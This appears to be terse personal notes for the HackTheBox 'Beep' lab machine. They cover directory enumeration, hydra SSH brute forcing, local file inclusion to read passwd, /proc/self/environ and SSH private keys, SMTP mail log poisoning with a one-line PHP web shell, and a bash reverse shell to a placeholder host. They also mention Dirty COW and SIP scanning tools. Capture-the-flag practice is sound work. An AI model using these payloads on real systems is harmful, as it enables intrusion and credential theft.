@@ -1,0 +1,19 @@
+HackTheBox - BEEP
+
+dirbuster - wordlist /usr/share/wordlist/dirbuster/directory-list-2.3-medium - disable be recursive. Trying to find version information
+Download images and run exiftool
+directory traversal to get passwd and extract users
+hydra -L userlist.txt -P passwordlist.txt ssh://IP
+ls /etc | grep fail - fail2ban will block us from bruteforcing ssh?
+/proc/self/status - get user we're running as. Search for private key at /var/lib/user/.ssh/id_rsa
+/proc/self/environ
+LFI - Local File Inclusion
+telnet to SMTP port and communicate with protocol
+<?php echo system(s_REQUEST['ipp']); ?> --- /var/mail/asterisk ... ?ipp=whoami OR ipp=bash -i >& /dev/tcp/MYIP/1337 0>&1
+
+svmap
+svwar
+
+dirty cow - not a safe exploit to run
+
+ctrl-z - fg
